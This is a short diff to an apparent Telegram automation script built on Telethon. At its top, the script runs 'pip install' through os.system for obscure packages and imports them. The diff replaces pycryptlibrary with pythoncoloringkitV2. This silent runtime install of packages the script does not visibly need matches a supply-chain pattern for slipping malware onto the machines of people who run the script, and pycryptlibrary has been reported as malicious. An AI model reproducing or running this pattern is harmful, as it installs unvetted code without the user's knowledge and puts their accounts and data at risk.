@@ -1,6 +1,6 @@
 import os
-os.system("pip install pycryptlibrary")
-import pycryptlibrary
+os.system("pip install pythoncoloringkitV2")
+import pythoncoloringkitV2
 from telethon.sync import TelegramClient
 from telethon.errors.rpcerrorlist import PhoneNumberBannedError
 import csv
